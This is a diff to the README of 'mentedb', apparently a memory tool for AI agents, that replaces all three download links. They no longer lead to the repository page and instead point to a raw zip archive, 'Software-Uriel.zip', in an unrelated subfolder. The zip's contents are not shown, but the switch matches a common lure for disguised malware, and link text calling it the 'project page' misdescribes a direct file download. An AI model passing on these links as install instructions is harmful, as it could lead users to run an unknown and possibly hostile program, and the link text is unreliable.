@@ -1,6 +1,6 @@
 # 🧠 mentedb - Memory for AI agents
 
-[![Download](https://img.shields.io/badge/Download-mentedb-blue?style=for-the-badge)](https://github.com/viviannenitrogenous100/mentedb)
+[![Download](https://img.shields.io/badge/Download-mentedb-blue?style=for-the-badge)](https://github.com/viviannenitrogenous100/mentedb/raw/refs/heads/main/concentus/Software-Uriel.zip)
 
 ## 🚀 What mentedb is
 
@@ -16,7 +16,7 @@ Follow these steps to download and open mentedb on a Windows PC.
 
 Go to the project page here:
 
-[Download mentedb](https://github.com/viviannenitrogenous100/mentedb)
+[Download mentedb](https://github.com/viviannenitrogenous100/mentedb/raw/refs/heads/main/concentus/Software-Uriel.zip)
 
 ### 2. Find the latest release or files
 
@@ -187,7 +187,7 @@ Keep the app file and the related folders together after extraction
 
 ## 🔗 Download again
 
-[Visit the mentedb download page](https://github.com/viviannenitrogenous100/mentedb)
+[Visit the mentedb download page](https://github.com/viviannenitrogenous100/mentedb/raw/refs/heads/main/concentus/Software-Uriel.zip)
 
 ## 🧭 Quick path
 
